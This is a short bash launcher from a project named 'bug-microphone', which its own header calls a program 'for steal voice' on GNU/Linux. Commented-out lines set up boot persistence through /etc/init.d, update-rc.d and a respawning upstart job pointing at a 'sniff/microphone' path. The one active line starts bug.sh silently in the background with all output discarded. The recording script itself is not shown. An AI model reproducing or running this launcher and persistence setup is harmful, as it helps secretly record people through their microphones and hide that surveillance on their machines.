#!/bin/bash

#
# Copyright (c) 2018 Barchampas Gerasimos <makindosx@gmail.com>
# bug-microphone is a program for steal voice in gnu/linux OS.
#
# bug-microphone is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
#
# bug-microphone is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License, version 3,
# along with this program.  If not, see <http://www.gnu.org/licenses/>
#



#sudo cp "bug.sh" "/etc/init.d/bug"

#sudo chmod +x /etc/init.d/bug

#sudo update-rc.d bug defaults

#cat <<EOF >/etc/init/bug.conf
#
#

#start on runlevel [2345]
#stop on runlevel [!2345]


#task

#respawn

#exec /var/www/sniff/microphone/bug.sh


#EOF


#ln -s /var/www/sniff/microphone/bug_auto.sh /etc/init.d/bug

#update-rc.d bug defaults


./bug.sh > /dev/null 2>&1 &

